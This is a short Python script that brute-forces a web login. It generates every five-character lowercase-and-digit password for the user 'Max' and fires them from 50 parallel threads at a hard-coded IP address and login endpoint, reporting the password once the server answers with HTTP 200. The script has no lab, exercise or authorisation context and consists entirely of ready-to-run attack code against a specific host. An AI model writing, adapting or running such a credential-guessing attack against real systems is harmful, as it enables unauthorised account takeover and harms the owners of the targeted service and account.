import requests
import itertools
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://98.70.102.40:8080/api/auth/secure-login"
username = "Max"
characters = string.ascii_lowercase + string.digits

# Flag to stop all threads if password is found
found = False

def try_password(pw):
    global found
    if found:
        return None
    data = {"username": username, "password": pw}
    try:
        res = requests.post(url, json=data, timeout=5)
        print(f"Trying: {pw} --> Status: {res.status_code}")
        if res.status_code == 200:
            found = True
            return pw
    except requests.RequestException:
        print(f"Error with password: {pw}")
    return None

def main():
    with ThreadPoolExecutor(max_workers=50) as executor:  # Adjust worker count to your CPU/network
        futures = []
        for pw_tuple in itertools.product(characters, repeat=5):
            if found:
                break
            pw = ''.join(pw_tuple)
            futures.append(executor.submit(try_password, pw))
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"\n✅ Success! Password found: {result}")
                break

if __name__ == "__main__":
    main()
